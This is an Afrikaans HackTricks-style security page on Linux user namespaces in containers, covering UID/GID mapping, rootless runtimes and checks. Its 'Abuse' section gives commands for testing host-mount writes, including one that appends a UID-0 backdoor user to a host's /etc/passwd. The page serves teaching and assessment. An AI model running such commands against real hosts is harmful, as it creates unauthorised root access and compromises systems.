# Gebruiker-namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die gebruiker-namespace verander die betekenis van user- en group-IDs deur die kernel toe te laat om die IDs wat binne die namespace gesien word na ander IDs buite daarvan te karteer. Dit is een van die belangrikste moderne container-beskermings omdat dit direk die grootste historiese probleem in klassieke containers aanspreek: **root inside the container used to be uncomfortably close to root on the host**.

Met gebruiker-namespaces kan 'n proses as UID 0 binne die container hardloop en steeds ooreenstem met 'n onbevoorregte UID-reeks op die host. Dit beteken die proses kan soos root optree vir baie in-container take terwyl dit baie minder kragtig is vanuit die host se oogpunt. Dit los nie elke container-sekuriteitsprobleem op nie, maar dit verander die gevolge van 'n containerkompromieering aansienlik.

## Werking

'n Gebruiker-namespace het karteer-lêers soos `/proc/self/uid_map` en `/proc/self/gid_map` wat beskryf hoe namespace-IDs na ouer-IDs vertaal word. As root binne die namespace na 'n onbevoorregte host UID gemap is, dra operasies wat regte host-root sou vereis eenvoudig nie dieselfde impak nie. Dit is hoekom gebruiker-namespaces sentraal is tot **rootless containers** en waarom dit een van die grootste verskille is tussen ouer rootful container-standaarde en meer moderne minste-privilege-ontwerpe.

Die punt is fyn maar noodsaaklik: root binne die container is nie uitgeskakel nie, dit word **vertaal**. Die proses ervaar steeds 'n root-agtige omgewing plaaslik, maar die host behoort dit nie as volle root te behandel nie.

## Lab

'n Handmatige toets is:
```bash
unshare --user --map-root-user --fork bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
```
Dit laat die huidige gebruiker binne die naamruimte as root voorkom, terwyl hy buite daarvan steeds nie host root is nie. Dit is een van die beste eenvoudige demo's om te verstaan waarom gebruiker-naamruimtes so waardevol is.

In kontainers kan jy die sigbare mapping vergelyk met:
```bash
docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
```
Die presiese uitset hang af daarvan of die engine user namespace remapping gebruik of 'n meer tradisionele rootful-konfigurasie.

Jy kan ook die mapping vanaf die host side lees met:
```bash
cat /proc/<pid>/uid_map
cat /proc/<pid>/gid_map
```
## Runtime-gebruik

Rootless Podman is een van die duidelikste voorbeelde van gebruiker-naamruimtes wat as 'n eerste-klas sekuriteitsmeganisme behandel word. Rootless Docker is ook daarvan afhanklik. Docker se userns-remap-ondersteuning verbeter ook veiligheid in rootful daemon-implementasies, alhoewel histories baie implementasies dit uitgeskakel het vir kompatibiliteitsredes. Kubernetes se ondersteuning vir gebruiker-naamruimtes het verbeter, maar aanneming en standaardinstellings verskil na gelang van runtime, distro, en clusterbeleid. Incus/LXC-stelsels vertrou ook sterk op UID/GID-verskuiwing en idmapping-idees.

Die algemene tendens is duidelik: omgewings wat gebruiker-naamruimtes ernstig gebruik, bied gewoonlik 'n beter antwoord op "wat beteken 'container root' eintlik?" as omgewings wat dit nie doen nie.

## Gevorderde toewysingsbesonderhede

Wanneer 'n onprivilegieerde proses na `uid_map` of `gid_map` skryf, pas die kernel strenger reëls toe as wat dit vir 'n bevoorregte ouer-naamruimte-skrywer doen. Slegs beperkte mappings is toegelaat, en vir `gid_map` moet die skrywer gewoonlik eers `setgroups(2)` deaktiveer:
```bash
cat /proc/self/setgroups
echo deny > /proc/self/setgroups
```
Hierdie detail is belangrik omdat dit verduidelik waarom user-namespace-opstelling soms in rootless-eksperimente faal en waarom runtimes noukeurige hulplogika rondom UID/GID-delegering nodig het.

Nog 'n gevorderde funksie is die **ID-mapped mount**. In plaas daarvan om eienaarskap op-disk te verander, pas 'n ID-mapped mount 'n user-namespace-mapping toe op 'n mount sodat eienaarskap deur daardie mount-uitsig vertaal lyk. Dit is veral relevant in rootless en moderne runtime-opstellings omdat dit toelaat dat gedeelde host-paaie gebruik word sonder dat daar recursive `chown`-operasies nodig is. Vanuit sekuriteitsoogpunt verander die funksie hoe skryfbaar 'n bind mount vanaf binne die namespace voorkom, selfs al herskryf dit nie die onderliggende lêerstelselmetadata nie.

Laastens, onthou dat wanneer 'n proses 'n nuwe user namespace skep of binnetree, dit 'n volledige capability set ontvang **binne daardie namespace**. Dit beteken nie dat dit skielik host-globale mag verkry het nie. Dit beteken dat daardie capabilities slegs gebruik kan word waar die namespace-model en ander beskermings dit toelaat. Dit is die rede waarom `unshare -U` skielik mounting of namespace-lokale geprivilegieerde operasies moontlik kan maak sonder om die host-root-grens direk te laat verdwyn.

## Misconfigurations

Die grootste swakpunt is eenvoudigweg om user namespaces nie te gebruik in omgewings waar dit uitvoerbaar sou wees nie. As container root te direk na host root gekarteer is, word skryfbare host mounts en geprivilegieerde kernel-operasies baie gevaarliker. 'n Ander probleem is om host user namespace-sharing af te dwing of remapping te deaktiveer vir kompabiliteit sonder om te erken hoeveel dit die vertrouensgrens verander.

User namespaces moet ook saam met die res van die model oorweeg word. Selfs wanneer hulle aktief is, kan 'n wye runtime API-blootstelling of 'n baie swak runtime-konfigurasie steeds privilege escalation via ander paaie toelaat. Sonder hulle raak baie ou breakout-klasses egter veel makliker om te eksploiteer.

## Abuse

As die container rootful is sonder user namespace-separasie, word 'n skryfbare host bind mount baie gevaarliker omdat die proses moontlik regtig as host root skryf. Gevaarlike capabilities word ook meer betekenisvol. Die aanvaller hoef nie meer so hard teen die translation boundary te baklei nie, want die translation boundary bestaan byna nie.

Die teenwoordigheid of afwesigheid van 'n user namespace moet vroeg nagegaan word wanneer 'n container breakout-pad geëvalueer word. Dit beantwoord nie elke vraag nie, maar dit wys onmiddellik of "root in container" direkte host-relevansie het.

Die mees praktiese misbruikpatroon is om die mapping te bevestig en dan onmiddellik te toets of host-mounted inhoud skryfbaar is met host-relevante privileges:
```bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
ls -ln /host/tmp/userns_test 2>/dev/null
```
As die lêer as die werklike host root geskep word, is user namespace isolation effektief afwesig vir daardie pad. Op daardie punt word klassieke host-file abuses realisties:
```bash
echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
cat /host/etc/passwd | tail
```
'n Veiliger bevestiging tydens 'n lewende assessering is om 'n onskadelike merker te skryf in plaas daarvan om kritieke lêers te wysig:
```bash
echo test > /host/root/userns_marker 2>/dev/null
ls -l /host/root/userns_marker 2>/dev/null
```
Hierdie kontroles is belangrik omdat hulle die werklike vraag vinnig beantwoord: kom root in hierdie container genoeg ooreen met root op die host dat 'n skryfbare host-mount onmiddellik 'n pad tot kompromittering van die host word?

### Volledige voorbeeld: Herwin namespace-lokale bevoegdhede

As seccomp `unshare` toelaat en die omgewing 'n nuwe user namespace toelaat, kan die proses 'n volle stel bevoegdhede binne daardie nuwe namespace herwin:
```bash
unshare -UrmCpf bash
grep CapEff /proc/self/status
mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
```
Dit is op sigself nie 'n host escape' nie. Die rede waarom dit saak maak, is dat user namespaces weer gemagtigde namespace-lokale aksies moontlik kan maak wat later saamwerk met swak mounts, kwesbare kernels, of sleg blootgestelde runtime-oppervlakke.

## Kontroles

Hierdie opdragte is bedoel om die belangrikste vraag op hierdie bladsy te beantwoord: waarmee ooreenstem root binne hierdie container op die host?
```bash
readlink /proc/self/ns/user   # User namespace identifier
id                            # Current UID/GID as seen inside the container
cat /proc/self/uid_map        # UID translation to parent namespace
cat /proc/self/gid_map        # GID translation to parent namespace
cat /proc/self/setgroups 2>/dev/null   # GID-mapping restrictions for unprivileged writers
```
Wat hier interessant is:

- As die proses UID 0 is en die maps 'n direkte of baie noue gasheer-root-kartering toon, is die container aansienlik gevaarliker.
- As root na 'n nie-geprivilegieerde gasheerreeks gekarteer word, is dit 'n baie veiliger basislyn en dui dit gewoonlik op werklike user namespace isolasie.
- Die karteringslêers is meer waardevol as net `id`, omdat `id` slegs die identiteit binne die plaaslike naamruimte wys.

As die workload as UID 0 loop en die kartering wys dat dit nou met gasheer-root ooreenstem, moet jy die res van die container se voorregte baie strenger interpreteer.
